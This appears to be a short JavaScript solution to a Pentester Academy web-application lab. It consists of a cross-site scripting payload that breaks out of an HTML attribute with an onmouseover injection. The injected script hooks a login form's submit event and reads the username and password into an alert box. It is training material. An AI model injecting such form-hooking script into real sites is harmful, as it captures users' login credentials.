// https://pentesteracademylab.appspot.com/lab/webapp/jfp/8

// Objectives:
//     Pop the password in an alert box when the user submits the form

" onmouseover="
document.forms[0].addEventListener('submit', function (){
    var username = document.forms[0].elements[0].value;
    var password = document.forms[0].elements[1].value;
    alert('Username: '+ username + '\nPassword: ' + password) 
})